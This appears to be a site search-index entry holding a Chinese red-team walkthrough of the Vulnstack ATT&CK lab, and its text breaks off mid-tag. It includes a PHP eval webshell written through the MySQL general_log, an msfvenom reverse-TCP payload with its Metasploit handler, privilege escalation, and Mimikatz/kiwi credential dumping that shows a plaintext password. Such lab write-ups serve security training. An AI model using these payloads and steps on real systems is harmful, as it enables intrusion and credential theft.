<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ATT&amp;CK实战系列——红队实战（一）</title>
      <link href="/WEB/ATT&amp;CK-1/"/>
      <url>/WEB/ATT&amp;CK-1/</url>
      
        <content type="html"><![CDATA[<h1 id="ATT-amp-CK实战系列——红队实战（一）"><a href="#ATT-amp-CK实战系列——红队实战（一）" class="headerlink" title="ATT&amp;CK实战系列——红队实战（一）"></a>ATT&amp;CK实战系列——红队实战（一）</h1><p>纯小白向文章，大佬勿喷，有错误的地方希望大佬们指正</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p>红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。另外本次实战完全模拟ATT&amp;CK攻击链路进行搭建，开成完整闭环。后续也会搭建真实APT实战环境，从实战中成长。关于环境可以模拟出各种各样实战路线，目前给出作者实战的一套攻击实战路线如下，虚拟机所有统一密码：hongrisec@2019：</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>拓朴图如下： </p><p>（win7为VM1，win2003为VM2，win2008为VM3）</p><p><img src="/WEB/ATT&CK-1/%E7%BB%98%E5%9B%BE2.png" alt="绘图2"></p><h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p>因为我的kali是用wsl2搭建的，而靶机是在vmware下搭建的，所以要重新配置一下vmware的虚拟网卡<br>首先，要获取WSL2下kali的虚拟网络的IP地址和子网掩码</p><p>通过命令：<code> ifconfig</code></p><p><img src="/WEB/ATT&CK-1/image-20230420174034744.png" alt="image-20230420174034744"></p><p>可以看到kali的ip为172.22.251.229 </p><p>为了使vmware中运行的虚拟机可以和kali互通，需要在VMware虚拟网络编辑器中设置一个自定义虚拟网络，从而让kali和web服务器在同一个子网内</p><p>基本步骤：</p><ol><li>打开VMware虚拟网络编辑器。</li><li>点击“更改设置”按钮，然后在“网络适配器”选项卡上选择一个适配器，例如VMnet8。</li><li>在“子网IP”部分，选择一个未使用的IP地址，例如172.22.8.1，并确保子网掩码设置为255.255.255.0。</li><li>点击“NAT设置”按钮，在“网关IP”部分，输入172.22.8.2。</li><li>点击“确定”保存更改，并关闭VMware虚拟网络编辑器。</li></ol><p><img src="/WEB/ATT&CK-1/image-20230420174434468.png" alt="image-20230420174434468"></p><p>至此，靶机中的web服务器就可以和kali攻击机互通了，</p><p>接下来就要配置靶机的内网环境，通过在web服务器新建一个网卡来实现模拟内网环境</p><p>（如下面的丑图所示</p><p><img src="/WEB/ATT&CK-1/image-20230424112740272.png" alt="image-20230424112740272"></p><p><img src="/WEB/ATT&CK-1/image-20230421124532135.png" alt="image-20230421124532135"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">攻击机：</span><br><span class="line"></span><br><span class="line">kali ip:172.22.251.229</span><br><span class="line"></span><br><span class="line">靶机：</span><br><span class="line"></span><br><span class="line">win7 外网ip:172.22.8.128  内网ip:192.168.52.143</span><br><span class="line"></span><br><span class="line">win2k3 ip:192.168.52.141</span><br><span class="line"></span><br><span class="line">win2008 ip:192.168.52.138</span><br></pre></td></tr></table></figure><h4 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h4><p>最后在win7（web服务器）通过phpstudy启动服务，并在本地访问成功，就算正式部署好环境了<br><img src="/WEB/ATT&CK-1/image-20230421124829710.png" alt="image-20230421124829710"></p><p><img src="/WEB/ATT&CK-1/image-20230421124927290.png" alt="image-20230421124927290"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>首先我们知道了目标ip是172.22.8.128</p><p>使用nmap扫描目标开放的端口信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn 172.22.8.128</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230421130654461.png" alt="image-20230421130654461"></p><h3 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><p>看web服务就是phpStudy 探针，先进行目录爆破看看有没有泄露的</p><p><img src="/WEB/ATT&CK-1/image-20230421170620518.png" alt="image-20230421170620518"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://172.22.8.128/l.php</span><br><span class="line">http://172.22.8.128/phpinfo.php</span><br><span class="line">http://172.22.8.128/phpmyadmin/</span><br><span class="line">http://172.22.8.128/beifen.rar</span><br></pre></td></tr></table></figure><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><p>可以看到有泄露了一个beifen.rar</p><p>下载下来发现是网站的源码</p><p><img src="/WEB/ATT&CK-1/image-20230421170711332.png" alt="image-20230421170711332"></p><h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><h4 id="数据库账号密码"><a href="#数据库账号密码" class="headerlink" title="数据库账号密码"></a>数据库账号密码</h4><p>浏览一下源码，发现泄露了数据库的用户名和密码（源码泄露后可以通过正则快速发现源码中的敏感信息）</p><p><img src="/WEB/ATT&CK-1/image-20230421172119015.png" alt="image-20230421172119015"></p><p>再结合上面目录爆破出的phpmyadmin，我们就可以通过泄露的用户名密码直接登录，可以看到数据库的用户名密码是弱口令，如果没有泄露源码，也可以直接弱口令爆破出正确密码。</p><h4 id="网站后台账号密码"><a href="#网站后台账号密码" class="headerlink" title="网站后台账号密码"></a>网站后台账号密码</h4><p>通过备份文件中的yxcms猜测网站路径，发现后台账号密码泄露（。。。。。。</p><p><img src="/WEB/ATT&CK-1/image-20230421172940784.png" alt="image-20230421172940784"></p><h2 id="漏洞挖掘-amp-利用"><a href="#漏洞挖掘-amp-利用" class="headerlink" title="漏洞挖掘&amp;利用"></a>漏洞挖掘&amp;利用</h2><h3 id="网站后台"><a href="#网站后台" class="headerlink" title="网站后台"></a>网站后台</h3><p>通过信息泄露登录后台</p><p><img src="/WEB/ATT&CK-1/image-20230421173140911.png" alt="image-20230421173140911"></p><h4 id="后台getshell思路"><a href="#后台getshell思路" class="headerlink" title="后台getshell思路"></a>后台getshell思路</h4><ol><li>后台数据库备份Getshell</li><li>各类上传Getshell</li><li>修改网站上传类型Getshell</li><li>上传其他脚本类型Getshell</li><li>编辑器漏洞Getshell</li><li>网站配置插马Getshell</li><li>编辑模版Getshell</li><li>修改脚本文件Getshell</li><li>……</li></ol><h4 id="编辑模板Getshell"><a href="#编辑模板Getshell" class="headerlink" title="编辑模板Getshell"></a>编辑模板Getshell</h4><h5 id="上传恶意模板文件"><a href="#上传恶意模板文件" class="headerlink" title="上传恶意模板文件"></a>上传恶意模板文件</h5><p>新建一个模板写一句话</p><p><img src="/WEB/ATT&CK-1/image-20230421174611290.png" alt="image-20230421174611290"></p><p><img src="/WEB/ATT&CK-1/image-20230421174554244.png" alt="image-20230421174554244"></p><p>上传成功想直接访问试试，但是不出意外not found了<br><img src="/WEB/ATT&CK-1/image-20230422112108151.png" alt="image-20230422112108151"></p><h5 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h5><p>暂时不知道上传的模板文件去哪里了，还是先扫一下目录</p><p><img src="/WEB/ATT&CK-1/image-20230422112305406.png" alt="image-20230422112305406"></p><h5 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h5><p>发现扫出了不少东西，一一访问一下看看，发现public&#x2F; protected&#x2F; upload&#x2F;下居然都有目录遍历漏洞，那么我们就可以通过它来找到上传的模板文件了，都访问一下，终于在protected&#x2F;下找到了上传的模板文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/yxcms/protected/apps/default/view/default/</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230422112804683.png" alt="image-20230422112804683"></p><h5 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h5><p>然后就可以直接通过蚁剑连接了，成功Getshell</p><p><img src="/WEB/ATT&CK-1/image-20230422113313035.png" alt="image-20230422113313035"></p><h3 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h3><p>通过泄露的root root登录</p><p><img src="/WEB/ATT&CK-1/image-20230421172528505.png" alt="image-20230421172528505"></p><h4 id="phpmyadmin-Getshell思路"><a href="#phpmyadmin-Getshell思路" class="headerlink" title="phpmyadmin Getshell思路"></a>phpmyadmin Getshell思路</h4><ol><li>查询物理路径</li><li>查询secure_file_priv参数</li><li>select into outfile直接写入</li><li>日志GetShell</li><li>使用慢查询日志getsehll</li><li>使用错误日志getshell</li><li>新表GetShell</li><li>特殊版本GetShell</li></ol><h4 id="获取真实路径"><a href="#获取真实路径" class="headerlink" title="获取真实路径"></a>获取真实路径</h4><p><img src="/WEB/ATT&CK-1/image-20230422113835846.png" alt="image-20230422113835846"></p><p>猜测网站路径为：C:&#x2F;phpStudy&#x2F;www&#x2F;</p><h4 id="查询secure-file-priv参数"><a href="#查询secure-file-priv参数" class="headerlink" title="查询secure_file_priv参数"></a>查询secure_file_priv参数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@secure_file_priv;</span><br></pre></td></tr></table></figure><p>发现值为NULL，无法通过select into outfile直接写入</p><p><img src="/WEB/ATT&CK-1/image-20230422122625392.png" alt="image-20230422122625392"></p><h4 id="尝试日志GetShell"><a href="#尝试日志GetShell" class="headerlink" title="尝试日志GetShell"></a>尝试日志GetShell</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>MySQL5.0版本以上会创建日志文件，通过修改日志的全局变量打开日志并指定日志保存路径，再通过查询写入一句话木马，此时该木马会被日志记录并生成日志文件，从而GetShell。但是前提是要对生成的日志文件有读写权限。</p><h5 id="查询日志全局变量"><a href="#查询日志全局变量" class="headerlink" title="查询日志全局变量"></a>查询日志全局变量</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230424114238106.png" alt="image-20230424114238106"></p><p>发现日志没有开启，且日志保存的路径不在网站目录下，那么我们需要修改一下配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;;    -- 打开日志保存</span><br><span class="line">set global general_log_file = &quot;C:/phpStudy/WWW/log.php&quot;; -- 设置日志保存路径,需先得知网站物理路径,否则即使写入了Shell也无法通过URL连接</span><br></pre></td></tr></table></figure><p>再次查询<br><img src="/WEB/ATT&CK-1/image-20230424114530045.png" alt="image-20230424114530045"></p><h5 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[cmd]); ?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230424114011597.png" alt="image-20230424114011597"></p><p>还写了两条语句方便理解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php?&gt;&#x27;;</span><br><span class="line">select &#x27;&lt;?php echo&quot;123&quot;?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p>访问url</p><p><a href="http://172.22.8.128/log.php">http://172.22.8.128/log.php</a></p><p>发现了这三条记录，第一条引号里面是空的，第三条输出了123，说明成功写入并且成功解析为php代码并执行了</p><p><img src="/WEB/ATT&CK-1/image-20230424115736873.png" alt="image-20230424115736873"></p><p>通过蚁剑连接</p><p><img src="/WEB/ATT&CK-1/image-20230424115932455.png" alt="image-20230424115932455"></p><p>还有更多getshell方式等待你们尝试</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p><img src="/WEB/ATT&CK-1/image-20230424120407952.png" alt="image-20230424120407952"></p><h3 id="Windows提权思路"><a href="#Windows提权思路" class="headerlink" title="Windows提权思路"></a>Windows提权思路</h3><ol><li>内核溢出漏洞提权</li><li>BypassUAC</li><li>DLL劫持</li><li>引号路径</li><li>服务权限</li><li>进程注入</li><li>令牌窃取</li><li>AT&amp;SC&amp;PS命令</li></ol><h4 id="内核溢出漏洞提权的利用"><a href="#内核溢出漏洞提权的利用" class="headerlink" title="内核溢出漏洞提权的利用"></a>内核溢出漏洞提权的利用</h4><p>一般就是收集一下windows的补丁和版本信息，然后和已知漏洞对比，寻找可利用的exp</p><p>可以使用一些github的项目自动对比</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/bitsadmin/wesng</span><br><span class="line">https://github.com/chroblert/WindowsVulnScan</span><br></pre></td></tr></table></figure><p>也可以使用cs和msf自动化</p><p>这里我就直接使用msf进行提权了</p><h3 id="利用msf提权"><a href="#利用msf提权" class="headerlink" title="利用msf提权"></a>利用msf提权</h3><h4 id="生成反弹后门"><a href="#生成反弹后门" class="headerlink" title="生成反弹后门"></a>生成反弹后门</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.251.229 LPORT=5555 -f exe -o msf.exe</span><br></pre></td></tr></table></figure><p>上传至<code>C:/phpStudy/tmp/</code>目录下，当然这里还有可以要用到免杀的知识，但是这个靶场并没有，等以后遇到了再写吧</p><p><img src="/WEB/ATT&CK-1/image-20230424130756744.png" alt="image-20230424130756744"></p><h4 id="配置监听会话"><a href="#配置监听会话" class="headerlink" title="配置监听会话"></a>配置监听会话</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 5555</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230424130941687.png" alt="image-20230424130941687"></p><p>然后在蚁剑执行反弹后门就行</p><p><img src="/WEB/ATT&CK-1/image-20230424131125156.png" alt="image-20230424131125156"></p><p><img src="/WEB/ATT&CK-1/image-20230424131144509.png" alt="image-20230424131144509"></p><p>有回显说明成功反弹shell</p><p>先background退出当前session，然后sessions查看session id</p><p><img src="/WEB/ATT&CK-1/image-20230424131612092.png" alt="image-20230424131612092"></p><h5 id="筛选EXP模块"><a href="#筛选EXP模块" class="headerlink" title="筛选EXP模块"></a>筛选EXP模块</h5><h6 id="半自动"><a href="#半自动" class="headerlink" title="半自动"></a>半自动</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/enum_patches（半自动：根据漏洞编号找出系统中安装的补丁）</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230424131952399.png" alt="image-20230424131952399"></p><h6 id="全自动"><a href="#全自动" class="headerlink" title="全自动"></a>全自动</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester（全自动：快速识别系统中可能被利用的漏洞）</span><br><span class="line">set showdescription true</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>exp之后就会自动识别，然后输出</p><p><img src="/WEB/ATT&CK-1/image-20230424131856785.png" alt="image-20230424131856785"></p><p>但是这个靶机只需要<code>getsystem</code></p><p><img src="/WEB/ATT&CK-1/image-20230424134406382.png" alt="image-20230424134406382"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="收集密码"><a href="#收集密码" class="headerlink" title="收集密码"></a>收集密码</h3><h4 id="使用kiwi模块"><a href="#使用kiwi模块" class="headerlink" title="使用kiwi模块"></a>使用kiwi模块</h4><p>加载kiwi模块</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429115504034.png" alt="image-20230429115504034"></p><p>可以看到提示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[!] <span class="title class_">Loaded</span> x86 <span class="title class_">Kiwi</span> on an x64 architecture</span><br></pre></td></tr></table></figure><p>报错解释回归到kiwi原理上：</p><p>kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。所以如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制。</p><p><img src="/WEB/ATT&CK-1/image-20230429115827625.png" alt="image-20230429115827625"></p><h4 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h4><p><img src="/WEB/ATT&CK-1/image-20230429120619900.png" alt="image-20230429120619900"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 488</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429120635610.png" alt="image-20230429120635610"></p><p>再load就没有报错了</p><p><img src="/WEB/ATT&CK-1/image-20230429120705919.png" alt="image-20230429120705919"></p><p>查看kiwi模块的使用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">help kiwi</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429120744638.png" alt="image-20230429120744638"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">lsa_dump_sam：dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件/编码</span><br></pre></td></tr></table></figure><p>使用creds_all获得本机密码</p><p><img src="/WEB/ATT&CK-1/image-20230429224629672.png" alt="image-20230429224629672"></p><h4 id="密码抓取"><a href="#密码抓取" class="headerlink" title="密码抓取"></a>密码抓取</h4><p>抓到了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">hongrisec@win7</span><br></pre></td></tr></table></figure><h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><p>这里借用一下迪总的图<br><img src="/WEB/ATT&CK-1/9dxsuZWjbEPQMl2vx1HSBA.png" alt="img"></p><h4 id="判断内网ip"><a href="#判断内网ip" class="headerlink" title="判断内网ip"></a>判断内网ip</h4><p>为192.168.52.1&#x2F;24</p><p><img src="/WEB/ATT&CK-1/image-20230429102446148.png" alt="image-20230429102446148"></p><h4 id="手动收集"><a href="#手动收集" class="headerlink" title="手动收集"></a>手动收集</h4><h5 id="shell后乱码"><a href="#shell后乱码" class="headerlink" title="shell后乱码"></a>shell后乱码</h5><p>进入shell后发现乱码，执行下面这条指令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Chcp 65001</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">net time /domain        #查看时间服务器</span><br><span class="line">net user /domain        #查看域用户</span><br><span class="line">net view /domain        #查看有几个域</span><br><span class="line">net group &quot;domain computers&quot; /domain         #查看域内所有的主机名</span><br><span class="line">net group &quot;domain admins&quot;   /domain          #查看域管理员</span><br><span class="line">net group &quot;domain controllers&quot; /domain       #查看域控</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429174428260.png" alt="image-20230429174428260"></p><h4 id="上传fscan"><a href="#上传fscan" class="headerlink" title="上传fscan"></a>上传fscan</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。<br> 支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。</p><p><img src="/WEB/ATT&CK-1/image-20230429102521400.png" alt="image-20230429102521400"></p><h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p>使用全部模块扫描内网</p><img src="/WEB/ATT&CK-1/image-20230429102712946.png" alt="image-20230429102712946" style="zoom:50%;"><h5 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">(icmp) Target 192.168.52.138  is alive</span><br><span class="line">(icmp) Target 192.168.52.143  is alive</span><br><span class="line">(icmp) Target 192.168.52.141  is alive</span><br><span class="line">[*] Icmp alive hosts len is: 3</span><br><span class="line">192.168.52.141:7001 open</span><br><span class="line">192.168.52.143:3306 open</span><br><span class="line">192.168.52.141:8099 open</span><br><span class="line">192.168.52.141:8098 open</span><br><span class="line">192.168.52.141:7002 open</span><br><span class="line">192.168.52.138:88 open</span><br><span class="line">192.168.52.141:445 open</span><br><span class="line">192.168.52.141:139 open</span><br><span class="line">192.168.52.143:445 open</span><br><span class="line">192.168.52.138:445 open</span><br><span class="line">192.168.52.143:139 open</span><br><span class="line">192.168.52.138:139 open</span><br><span class="line">192.168.52.141:135 open</span><br><span class="line">192.168.52.143:135 open</span><br><span class="line">192.168.52.138:135 open</span><br><span class="line">192.168.52.143:80 open</span><br><span class="line">192.168.52.138:80 open</span><br><span class="line">192.168.52.141:21 open</span><br><span class="line">[*] alive ports len is: 18</span><br><span class="line"></span><br><span class="line">start vulscan</span><br><span class="line"></span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.52.143</span><br><span class="line">   [-&gt;]stu1</span><br><span class="line">   [-&gt;]192.168.52.143</span><br><span class="line">   [-&gt;]169.254.129.186</span><br><span class="line">   [-&gt;]172.22.8.128</span><br><span class="line">[+] 192.168.52.143      MS17-010        (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[*] NetBios: 192.168.52.143  stu1.god.org                        Windows 7 Professional 7601 Service Pack 1</span><br><span class="line"></span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.52.138</span><br><span class="line">   [-&gt;]owa</span><br><span class="line">   [-&gt;]192.168.52.138</span><br><span class="line">[+] 192.168.52.138      MS17-010        (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)</span><br><span class="line"></span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.52.141</span><br><span class="line">   [-&gt;]root-tvi862ubeh</span><br><span class="line">   [-&gt;]192.168.52.141</span><br><span class="line">   </span><br><span class="line">[*] WebTitle: http://192.168.52.141:7002 code:200 len:2632   title:Sentinel Keys License Monitor</span><br><span class="line">[*] NetBios: 192.168.52.138  [+]DC owa.god.org                   Windows Server 2008 R2 Datacenter 7601 Service Pack 1</span><br><span class="line">[+] 192.168.52.141      MS17-010        (Windows Server 2003 3790)</span><br><span class="line">[*] WebTitle: http://192.168.52.138     code:200 len:689    title:IIS7</span><br><span class="line">[+] ftp://192.168.52.141:21:anonymous</span><br><span class="line">[*] WebTitle: http://192.168.52.143     code:200 len:14749  title:phpStudy 探针 2014</span><br><span class="line">[*] WebTitle: http://192.168.52.141:8099 code:403 len:1409   title:The page must be viewed over a secure channel</span><br><span class="line">已完成 18/18</span><br><span class="line">[*] 扫描结束,耗时: 21.4177141s</span><br></pre></td></tr></table></figure><h4 id="信息整理"><a href="#信息整理" class="headerlink" title="信息整理"></a>信息整理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">192.168.52.143 web服务器 stu1</span><br><span class="line">MS17-010  </span><br><span class="line">端口开放：</span><br><span class="line">3306 mysql</span><br><span class="line">445  tcp</span><br><span class="line">139  SMB</span><br><span class="line">135 RPC</span><br><span class="line">80 http</span><br><span class="line"></span><br><span class="line">192.168.52.138  DC owa.god.org  </span><br><span class="line">MS17-010  </span><br><span class="line">端口开放：</span><br><span class="line">445  tcp</span><br><span class="line">139  SMB</span><br><span class="line">135  RPC</span><br><span class="line">88</span><br><span class="line">80   http</span><br><span class="line"></span><br><span class="line">192.168.52.141  root-tvi862ubeh</span><br><span class="line">MS17-010  </span><br><span class="line">端口开放：</span><br><span class="line">8099</span><br><span class="line">8098</span><br><span class="line">7002</span><br><span class="line">7001 Weblogic</span><br><span class="line">445  tcp</span><br><span class="line">139  SMB</span><br><span class="line">135 RPC</span><br><span class="line">80 http</span><br><span class="line">21   ftp</span><br></pre></td></tr></table></figure><h5 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 